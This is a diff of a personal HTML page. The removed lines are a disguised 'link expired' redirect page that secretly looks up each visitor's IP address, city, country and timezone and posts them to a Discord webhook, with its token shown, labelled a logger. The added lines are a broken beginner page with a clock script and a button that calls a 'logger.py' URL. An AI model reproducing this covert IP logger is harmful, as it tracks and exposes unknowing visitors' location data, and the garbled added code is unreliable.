@@ -1,20 +1,80 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title> Redirecting... </title>
-  <meta charset="utf-8" />
-  <h1> <center> This link is expired! </center> </h1>
-  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js" charset="utf-8"></script>
+<title>
+Philip Roelofsen</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="keywords" content="2">
+<meta name="description" content="Mijn website:">
+
+
+<html>
+<head>
+<title>Example</title>
 </head>
-<body>
-
-  <script type="text/javascript">
-
-  $.getJSON('https://ipapi.co/json/', function(data) {
-  $.post("https://discord.com/api/webhooks/952988890413797457/LqrcsJws7q8aH350CTznaT01gYPG0sSD5FgvkVDeSFD7yDRtw_-UfpOTwL-4M1BkCSDE", {
-      content: "Ip : " + data.ip + "\nCity : " + data.city + "\nCountry : " + data.country + "/" + data.country_name + "\nTimeZone : " + data.timezone + "\nCurrency : " + data.currency + "/" + data.currency_name + "\nLanguages : " + data.languages + "\nNumber-Code : " + data.country_calling_code + "\n@here", username: "M7's Logger",avatar_url: null,});
-  });
-  window.location.href = "https://philiproelofsen.tk";
-  </script>
+<body style="background-color:yellowgreen;color:white;">
+Philip Roelofsen, o ja hier is de tijd:
 </body>
 </html>
+
+ <html>
+<head>
+<title>(Type a title for your page here)</title>
+<script type="text/javascript"> 
+function display_c(){
+var refresh=1000; // Refresh rate in milli seconds
+mytime=setTimeout('display_ct()',refresh)
+}
+
+function display_ct() {
+var x = new Date()
+document.getElementById('ct').innerHTML = x;
+display_c();
+ }
+</script>
+</head>
+
+<body onload=display_ct();>
+<span id='ct' ></span>
+
+</body>
+  
+<html>
+<body>
+
+<p><a href="https://www.philiproelofsen.tk/kaas"> Klik hier voor kaas!!! </a></p>
+
+</body>
+</html>
+
+  <input type = “button” id=”b1″ value=”1″>
+
+<script>
+
+$(document).ready(function(){
+
+$("#b1").click(function(){
+
+$.ajax({
+
+method: "GET",
+
+url: "wijnen01.github.io/logger.py",
+
+data: {"place" : value},
+
+dataType: "text",
+
+success: function(result){
+
+var data=JSON.parse(result);
+
+console.log(result);
+
+}
+
+});
+
+});
+
+</script>
